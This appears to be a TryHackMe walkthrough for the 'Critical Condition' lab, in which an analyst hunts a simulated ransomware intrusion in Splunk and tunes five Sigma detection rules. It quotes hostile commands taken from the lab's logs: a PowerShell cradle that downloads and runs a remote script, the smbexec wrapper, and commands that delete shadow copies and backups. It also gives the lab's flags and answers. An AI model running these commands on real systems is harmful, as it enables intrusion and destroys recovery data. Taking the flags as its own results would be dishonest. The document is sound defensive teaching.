# TryHackMe: Critical Condition — Walkthrough

**Date:** 2026-11-04  
**Room:** Critical Condition  
**Analyst:** Will Lawson  
**Category:** Detection Engineering / Sigma / Splunk / Ransomware Precursors

---

## Overview

TSS Security Services was engaged by Cedar Hollow Health Network after a WARD SPIDER intrusion walked the full ransomware-precursor kill chain without firing a single alert: VPN appliance exploit → discovery → DCSync → SMBexec onto the backup server → recovery inhibition → fleet-wide service staging. Jordan Blake from CSIRT opened five pull requests in the Detection-as-Code (DaC) repo, one per stage, each shipping a rough Sigma rule. My job was to research each technique in Splunk, learn how the hospital estate normally behaves, and tune every rule until it passed four CI gates: Sigma syntax, SPL conversion, Environment Validation (true/false positives against real data) and an Automated Red Team Test (bypass attempts).

**Flags:**

| PR | Flag |
|---|---|
| #1 | `THM{W0rk3r_Pr0cess_G0nE_R0gue}` |
| #2 | `THM{R3pl1c4t3_4ll_th3_Th1ngs}` |
| #3 | `THM{N0_B1n4ry_N0_Pr0bl3m}` |
| #4 | `THM{Sh4d0w_C0p13s_G0ne}` |
| #5 | `THM{Sv6ch0st_D035Nt_L1ve_1n_T3mp}` |

---

## Getting Oriented

The room's reverse-proxy URL opened the TSS Operations Hub (case briefing). Port 80 on the lab IP served Splunk directly. A full port scan from my WSL Kali box only showed 22 and 80, and Splunk's app list had no DaC app (`dac_lab` was just the data). I eventually found the DaC app as a path on the reverse proxy:

```
https://<lab>.reverse-proxy.cell-prod-us-west-2a.vm.tryhackme.com/dac-site
```

Lesson: when the scan shows one web port, the second app is usually a path or vhost behind the same proxy.

### What data exists

```spl
| tstats count where index=* by index, sourcetype, host
```

Only `index=dac_lab` with two sourcetypes: `sysmon:process_creation` (128 events) and `wineventlog:security` (103 events). My first filtered search returned nothing because I guessed field names, so I pulled one raw event and learned the host field was `ComputerName`, not `Computer`. With only 128 process events, I simply dumped the full timeline:

```spl
index=dac_lab sourcetype="sysmon:process_creation"
| table _time, ComputerName, User, ParentImage, Image, CommandLine
| sort _time
```

That one table carried most of the investigation. It showed the attack and, just as importantly, the legitimate noise every rule would have to survive.

---

## Q1 — Script Downloaded via the VPN Executable

On VPN-GW01, `C:\Program Files\NetGate\NetGateWorker.exe` (running as `NT AUTHORITY\NETWORK SERVICE`) spawned `cmd.exe /c whoami /all`, a discovery one-liner (`ipconfig`, `net view /domain`, `nltest /dclist:chhn.local`) and an encoded PowerShell command. Decoding the UTF-16LE base64 gave:

```powershell
IEX (New-Object Net.WebClient).DownloadString('http://192.168.99.15/st2.ps1')
```

**Answer:** `st2.ps1`

The worker's only legitimate child in the data was `NetGateWatchdog.exe --heartbeat`.

## Q7 — Parent Command Line Behind the Shadow-Copy Deletion

The same timeline showed recovery inhibition on BKP-CHHN01 as LocalSystem, under `cmd.exe`. I pulled the parent command line:

```spl
index=dac_lab sourcetype="sysmon:process_creation" ComputerName="BKP-CHHN01" ParentImage="*cmd.exe"
| table _time, User, ParentCommandLine, CommandLine
| sort _time
```

All five commands (`vssadmin delete shadows /all /quiet`, `wmic shadowcopy delete`, `wbadmin delete catalog -quiet`, two `bcdedit` changes) shared the Impacket smbexec wrapper as parent.

**Answer:** `cmd.exe /Q /c echo <cmd> ^> \\127.0.0.1\ADMIN$\__1706930112.558359 2^>^&1 > C:\Windows\Temp\execute.bat`

I also noted a trap for later: `CHHNBackupAgent.exe` running `vssadmin delete shadows /for=D: /oldest` as `CHHN\svc_backup` is routine shadow rotation, not an attack.

## Q3 — DCSync Account

I checked which security events existed (4662, 5140, 5145, 7045), then filtered 4662 on the replication GUIDs:

```spl
index=dac_lab sourcetype="wineventlog:security" EventCode=4662 ("1131f6aa*" OR "1131f6ad*" OR "89e95b76*")
| table _time, ComputerName, SubjectUserName, SubjectDomainName, Properties
| sort _time
```

The baseline was clear: `DC-CHHN01$` and `DC-CHHN02$` replicated with each other, and `svc_dirsync` replicated every 30 minutes like clockwork (a directory sync service). One outlier appeared at 03:35:12 on DC-CHHN01, right after the VPN compromise.

**Answer:** `svc_netgate` — the VPN appliance's own AD bind account, which the report confirmed had legacy replication rights.

## Q5 — SMBexec Execution Time

```spl
index=dac_lab sourcetype="wineventlog:security" EventCode=7045 ComputerName="BKP-CHHN01"
| table _time, ServiceName, ServiceFileName, StartType, AccountName
| sort _time
```

Service `TVXR8F3K` (random 8-char name, LocalSystem, `\\127.0.0.1\ADMIN$\__<epoch>`, `execute.bat`) was the smbexec install. Two `ITOpsExec_*` services from `svc_itops_exec` used a near-identical echo/bat wrapper, but wrote output to `\\FS-ITOPS01\ADMIN$\logs\` — legitimate IT Ops tooling that any SMBexec rule must not trip on.

**Answer:** `03/02/2026 03:47:33.000`

## Q9 — First Host with Persistence

```spl
index=dac_lab sourcetype="wineventlog:security" EventCode=7045 ComputerName!="BKP-CHHN01"
| table _time, ComputerName, ServiceName, ServiceFileName, StartType, AccountName
| sort _time
```

The estate installs plenty of services legitimately (`ITOpsPatch_*` via `svc_patchmgmt` from `C:\ProgramData\ITOpsPatch\deploy.exe`, EHRSuiteUpdater, CrowdStrike, the backup agent). The malicious one was `svchost32` → `C:\Windows\Temp\svchost.exe`, landing first on CHHN-PC03 at 04:05:30, then PC11, PC27 and FS-EHR01.

**Answer:** `CHHN-PC03`

The CSIRT incident report in the repo's `threat-intel/` folder matched everything I'd found in Splunk.

---

## PR #1 — VPN Worker Spawns Suspicious Child (T1190)

**Original problem:** the rule only matched `certutil.exe` as a child of `NetGateWorker.exe`. The attacker used `cmd.exe` and `powershell.exe`, so it never fired.

**First fix:** I expanded the child list to interpreters and LOLBins. Syntax, conversion and environment passed, but the red team beat it twice: `msiexec` wasn't in my list, and a shell spawned by a *companion* NetGate process wasn't covered because I only watched the main worker as parent.

**Course correction:** a blocklist of children will always miss something. The appliance's only legitimate child lives in its own folder, so I flipped to an allowlist on both sides.

**Final passing rule:**

```yaml
title: VPN Appliance Process Spawns Unexpected Child Process
id: 4eb5804a-4827-4309-9e31-21ce8f52e873
status: experimental
description: Detects any NetGate Secure Access VPN appliance process launching a child outside the appliance's own package, consistent with post exploitation following an authentication bypass and remote code execution chain.
author: jordan-blake
logsource:
  product: windows
  category: process_creation
detection:
  selection:
    ParentImage|contains: '\Program Files\NetGate\'
  filter_appliance_children:
    Image|startswith: 'C:\Program Files\NetGate\'
  condition: selection and not filter_appliance_children
falsepositives:
  - Legitimate appliance children (NetGateWatchdog.exe heartbeat) are excluded by path
level: critical
tags:
  - attack.initial_access
  - attack.t1190
  - attack.execution
  - attack.t1059
```

Environment 100% (TP 3, FP 0), red team 3/3. **Flag:** `THM{W0rk3r_Pr0cess_G0nE_R0gue}`

## PR #2 — DCSync (T1003.006)

**Original problems:** `AccessMask: '0x20'` instead of `0x100` (Control Access), no replication GUID check, and a filter dropping any account containing `$`.

**First fix:** `0x100`, the three replication GUIDs (plus the `DS-Replication-Get-Changes` name form), exclude machine accounts by `endswith: '$'` and exclude `svc_dirsync`. The red team bypassed it with a compromised *workstation* machine account: anything ending in `$` was waved through along with the real DCs.

**Course correction:** exempt only the exact legitimate principals.

**Final passing rule:**

```yaml
title: Directory Replication Rights Abused for DCSync Credential Theft
id: 14b2e79e-8b34-4e36-a097-900fef85f839
status: experimental
description: Detects a non domain controller principal invoking the Directory Replication Service Remote Protocol with replication extended rights, consistent with a DCSync credential theft attack.
author: jordan-blake
logsource:
  product: windows
  service: security
detection:
  selection:
    EventID: 4662
    AccessMask: '0x100'
    Properties|contains:
      - '1131f6aa-9c07-11d1-f79f-00c04fc2dcd2'
      - '1131f6ad-9c07-11d1-f79f-00c04fc2dcd2'
      - '89e95b76-444d-4c62-991a-0facbeda640c'
      - 'DS-Replication-Get-Changes'
  filter_legit_replicators:
    SubjectUserName:
      - 'DC-CHHN01$'
      - 'DC-CHHN02$'
      - 'svc_dirsync'
  condition: selection and not filter_legit_replicators
falsepositives:
  - New domain controllers must be added to the exemption list
level: critical
tags:
  - attack.credential_access
  - attack.t1003.006
```

All checks passed. **Flag:** `THM{R3pl1c4t3_4ll_th3_Th1ngs}`

## PR #3 — SMBexec Service Execution (T1021.002 / T1569.002)

**Original problems:** scoped to the two DCs only (the attack hit BKP-CHHN01), matched `powershell` instead of the cmd echo wrapper, and *excluded LocalSystem* — the exact context SMBexec services run in.

**First fix:** any host, cmd interpreter + `/Q /c` + `echo` + `2^>^&1` + ADMIN$/C$/.bat output, with a two-condition IT Ops exemption (`svc_itops_exec` **and** `\\FS-ITOPS01\ADMIN$\logs\`, so an attacker can't spoof just one). The red team dropped the `/Q` flag and walked past it.

**Course correction:** match only the parts the technique can't drop — cmd interpreter, a run switch (`/c` or `/k`), `echo`, and share or batch output.

**Final passing rule:**

```yaml
title: SMBExec Style Remote Service Execution
id: 4385ce2c-46a8-40ed-a32f-61ae9a3c7ec0
status: experimental
description: Detects the distinctive command wrapper and share reference pattern Impacket style SMBExec tooling uses when creating a temporary Windows service for remote command execution.
author: jordan-blake
logsource:
  product: windows
  service: security
detection:
  selection_service:
    EventID: 7045
  selection_interpreter:
    ServiceFileName|contains:
      - 'cmd.exe'
      - '%COMSPEC%'
      - 'cmd '
  selection_switch:
    ServiceFileName|contains:
      - '/c'
      - '/k'
      - '/C'
      - '/K'
  selection_echo:
    ServiceFileName|contains: 'echo'
  selection_output:
    ServiceFileName|contains:
      - '\ADMIN$\'
      - '\C$\'
      - '.bat'
  filter_itops_tool:
    AccountName: 'svc_itops_exec'
    ServiceFileName|contains: '\\FS-ITOPS01\ADMIN$\logs\'
  condition: selection_service and selection_interpreter and selection_switch and selection_echo and selection_output and not filter_itops_tool
falsepositives:
  - Sanctioned IT Ops remote execution (svc_itops_exec writing to FS-ITOPS01) is excluded only when both account and share match
level: high
tags:
  - attack.lateral_movement
  - attack.t1021.002
  - attack.execution
  - attack.t1569.002
```

All checks passed. **Flag:** `THM{N0_B1n4ry_N0_Pr0bl3m}`

## PR #4 — Inhibit System Recovery (T1490)

**Original problems:** only `vssadmin resize shadowstorage`, and an exemption for any parent user containing `svc_backup`.

**First fix:** one selection pair per tool (vssadmin delete/resize, wmic shadowcopy delete, wbadmin delete catalog/systemstatebackup/backup, bcdedit recoveryenabled/bootstatuspolicy, PowerShell `Win32_ShadowCopy`), matched on `Image` **or** `OriginalFileName` to survive renamed binaries. The backup exemption required all three of: parent `CHHNBackupAgent.exe`, user `CHHN\svc_backup`, and a `delete shadows ... /oldest` command line. The red team got through with `diskshadow.exe`.

**Course correction:** diskshadow normally runs from a script file (`diskshadow /s x.txt`), so the delete never shows on the command line. I flag any diskshadow execution; admins rarely use it.

**Final passing rule:**

```yaml
title: Backup Server Recovery Capability Deliberately Disabled
id: 5dbbc762-f0c3-4425-a570-23a59883d55b
status: experimental
description: Detects native tools or their PowerShell WMI equivalent being used to delete shadow copies, delete the backup catalog, or disable boot time recovery.
author: jordan-blake
logsource:
  product: windows
  category: process_creation
detection:
  selection_vssadmin:
    - Image|endswith: '\vssadmin.exe'
    - OriginalFileName: 'VSSADMIN.EXE'
  selection_vssadmin_cmd:
    CommandLine|contains:
      - 'delete shadows'
      - 'resize shadowstorage'
  selection_wmic:
    - Image|endswith: '\wmic.exe'
    - OriginalFileName: 'wmic.exe'
  selection_wmic_cmd:
    CommandLine|contains|all:
      - 'shadowcopy'
      - 'delete'
  selection_wbadmin:
    - Image|endswith: '\wbadmin.exe'
    - OriginalFileName: 'WBADMIN.EXE'
  selection_wbadmin_cmd:
    CommandLine|contains:
      - 'delete catalog'
      - 'delete systemstatebackup'
      - 'delete backup'
  selection_bcdedit:
    - Image|endswith: '\bcdedit.exe'
    - OriginalFileName: 'bcdedit.exe'
  selection_bcdedit_cmd:
    CommandLine|contains:
      - 'recoveryenabled no'
      - 'recoveryenabled off'
      - 'bootstatuspolicy ignoreallfailures'
  selection_diskshadow:
    - Image|endswith: '\diskshadow.exe'
    - OriginalFileName: 'diskshadow.exe'
  selection_powershell:
    - Image|endswith:
        - '\powershell.exe'
        - '\pwsh.exe'
    - OriginalFileName:
        - 'PowerShell.EXE'
        - 'pwsh.dll'
  selection_powershell_cmd:
    CommandLine|contains: 'Win32_ShadowCopy'
  filter_backup_rotation:
    ParentImage: 'C:\Program Files\CHHNBackup\CHHNBackupAgent.exe'
    User: 'CHHN\svc_backup'
    CommandLine|contains|all:
      - 'delete shadows'
      - '/oldest'
  condition: >
    ((selection_vssadmin and selection_vssadmin_cmd) or
     (selection_wmic and selection_wmic_cmd) or
     (selection_wbadmin and selection_wbadmin_cmd) or
     (selection_bcdedit and selection_bcdedit_cmd) or
     selection_diskshadow or
     (selection_powershell and selection_powershell_cmd))
    and not filter_backup_rotation
falsepositives:
  - Scheduled CHHNBackupAgent rotation (oldest shadow on D:) is excluded only when parent, user and /oldest all match
  - Admin use of diskshadow.exe should be rare and reviewed
level: critical
tags:
  - attack.impact
  - attack.t1490
```

Red team 4/4. **Flag:** `THM{Sh4d0w_C0p13s_G0ne}`

## PR #5 — Fleet-Wide Service Staging (T1543.003 / T1569.002 / T1036.005)

**Original problem:** matched only PsExec's default `PSEXESVC` service name, then excluded anything containing `.exe` — it could never fire.

**First fix:** 7045 where the binary sits in a staging directory (`\Windows\Temp\`, `\AppData\`, `\ProgramData\`, etc.) or uses a core Windows process name outside System32/SysWOW64, with an exact two-condition exemption for `svc_patchmgmt` + `C:\ProgramData\ITOpsPatch\deploy.exe`.

**Environment failure (40%, TP 4, FP 6):** the six false positives were the five `ITOpsExec_*` services and the smbexec service — their cmd one-liners contain `C:\Windows\Temp\patch_xxxx.bat`, which tripped the staging-directory match. I first tried a regex requiring an executable inside the staging path, but the editor wouldn't commit. (That turned out to be a dropped lab connection; the reverse proxy needed a lab restart, and since flags publish per fix, nothing was lost.) I switched to a non-regex approach anyway: staging directory **and** `ServiceFileName|endswith` an executable extension. The wrappers end in `.bat`, so they fell out.

**Red team failure:** a `svchost.exe` placed in a *subfolder* of System32 passed my filter, because `contains: '\Windows\System32\'` matches any subfolder.

**Course correction:** exempt only exact full binary paths with `startswith`.

**Final passing rule:**

```yaml
title: Ransomware Payload Staged Fleet Wide via Remote Service Creation
id: 618ffb6f-c271-415a-b7fe-e8a8e28aee5a
status: experimental
description: Detects a payload masquerading as a core Windows process, or any binary staged from a classic living off the land directory, being installed as a remote service.
author: jordan-blake
logsource:
  product: windows
  service: security
detection:
  selection_service:
    EventID: 7045
  selection_staging_dir:
    ServiceFileName|contains:
      - '\Windows\Temp\'
      - '\AppData\'
      - '\Users\Public\'
      - '\ProgramData\'
      - '\PerfLogs\'
      - '\Temp\'
      - '\Windows\Tasks\'
      - '\Windows\Debug\'
  selection_staging_binary:
    ServiceFileName|endswith:
      - '.exe'
      - '.exe"'
      - '.dll'
      - '.scr'
      - '.com'
  selection_masquerade:
    ServiceFileName|contains:
      - '\svchost.exe'
      - '\lsass.exe'
      - '\csrss.exe'
      - '\services.exe'
      - '\smss.exe'
      - '\winlogon.exe'
      - '\wininit.exe'
      - '\explorer.exe'
      - '\spoolsv.exe'
      - '\taskhostw.exe'
      - '\rundll32.exe'
      - '\dllhost.exe'
  filter_masquerade_legit_path:
    ServiceFileName|startswith:
      - 'C:\Windows\System32\svchost.exe'
      - '"C:\Windows\System32\svchost.exe"'
      - '%SystemRoot%\System32\svchost.exe'
      - '%windir%\System32\svchost.exe'
      - 'C:\Windows\SysWOW64\svchost.exe'
      - 'C:\Windows\System32\lsass.exe'
      - '%SystemRoot%\System32\lsass.exe'
      - 'C:\Windows\System32\csrss.exe'
      - '%SystemRoot%\System32\csrss.exe'
      - 'C:\Windows\System32\services.exe'
      - '%SystemRoot%\System32\services.exe'
      - 'C:\Windows\System32\smss.exe'
      - '%SystemRoot%\System32\smss.exe'
      - 'C:\Windows\System32\winlogon.exe'
      - '%SystemRoot%\System32\winlogon.exe'
      - 'C:\Windows\System32\wininit.exe'
      - '%SystemRoot%\System32\wininit.exe'
      - 'C:\Windows\explorer.exe'
      - '%SystemRoot%\explorer.exe'
      - 'C:\Windows\System32\spoolsv.exe'
      - '%SystemRoot%\System32\spoolsv.exe'
      - 'C:\Windows\System32\taskhostw.exe'
      - '%SystemRoot%\System32\taskhostw.exe'
      - 'C:\Windows\System32\rundll32.exe'
      - '%SystemRoot%\System32\rundll32.exe'
      - 'C:\Windows\SysWOW64\rundll32.exe'
      - 'C:\Windows\System32\dllhost.exe'
      - '%SystemRoot%\System32\dllhost.exe'
  filter_patch_mgmt:
    AccountName: 'svc_patchmgmt'
    ServiceFileName|contains: 'C:\ProgramData\ITOpsPatch\deploy.exe'
  condition: selection_service and ((selection_staging_dir and selection_staging_binary) or (selection_masquerade and not filter_masquerade_legit_path)) and not filter_patch_mgmt
falsepositives:
  - Sanctioned ITOpsPatch deployments (svc_patchmgmt + C:\ProgramData\ITOpsPatch\deploy.exe) are excluded only when both match
level: critical
tags:
  - attack.persistence
  - attack.t1543.003
  - attack.execution
  - attack.t1569.002
  - attack.defense_evasion
  - attack.t1036.005
```

All checks passed. **Flag:** `THM{Sv6ch0st_D035Nt_L1ve_1n_T3mp}`

---

## Answers

| Q | Answer |
|---|---|
| Script downloaded via VPN executable | `st2.ps1` |
| PR #1 flag | `THM{W0rk3r_Pr0cess_G0nE_R0gue}` |
| DCSync account | `svc_netgate` |
| PR #2 flag | `THM{R3pl1c4t3_4ll_th3_Th1ngs}` |
| SMBexec execution time | `03/02/2026 03:47:33.000` |
| PR #3 flag | `THM{N0_B1n4ry_N0_Pr0bl3m}` |
| Shadow-copy parent command line | `cmd.exe /Q /c echo <cmd> ^> \\127.0.0.1\ADMIN$\__1706930112.558359 2^>^&1 > C:\Windows\Temp\execute.bat` |
| PR #4 flag | `THM{Sh4d0w_C0p13s_G0ne}` |
| First persistence host | `CHHN-PC03` |
| PR #5 flag | `THM{Sv6ch0st_D035Nt_L1ve_1n_T3mp}` |

---

## Attack Chain vs. Detections

```
VPN-GW01  NetGateWorker.exe (NETWORK SERVICE)
  ├─ cmd whoami / ipconfig / net view / nltest
  └─ powershell -enc → IEX DownloadString(http://192.168.99.15/st2.ps1)   ← PR #1
        │
        ▼  dsacls reveals svc_netgate has replication rights
DC-CHHN01  4662 svc_netgate, 0x100, DS-Replication-Get-Changes(-All)     ← PR #2
        │  d.marchetti (domain admin) hash recovered
        ▼
BKP-CHHN01  7045 TVXR8F3K → cmd /Q /c echo ... \\127.0.0.1\ADMIN$\__... ← PR #3
  └─ vssadmin / wmic / wbadmin / bcdedit under smbexec wrapper            ← PR #4
        │
        ▼
CHHN-PC03, PC11, PC27, FS-EHR01  7045 svchost32 → C:\Windows\Temp\svchost.exe ← PR #5
```

---

## Key Takeaways

| Lesson | Detail |
|---|---|
| **Baseline before you tune** | Every rule's hardest problem was a legitimate lookalike: NetGate heartbeat, DC/dirsync replication, ITOpsExec wrappers, backup rotation, ITOpsPatch services. Dumping the small dataset first exposed all of them. |
| **Allowlist the known-good, don't blocklist the bad** | PR #1 only passed once I stopped listing bad children and instead allowed only the appliance's own binaries. |
| **Exempt exact principals and paths** | `contains '$'` and `contains '\System32\'` were both bypassed. Use exact names and `startswith` full paths. |
| **Two-condition exemptions** | Tie exemptions to account **and** path/share so an attacker can't match one to slip through. |
| **Match the invariant, not the sample** | SMBexec dropped `/Q`; renamed binaries need `OriginalFileName`; diskshadow hides its verb in a script file. |
| **Watch substring collisions** | `\Windows\Temp\` inside a `.bat` path in a cmd one-liner caused six false positives in PR #5. |
| **Find the app first** | The DaC app was a path (`/dac-site`) on the reverse proxy, not a separate port or Splunk app. |
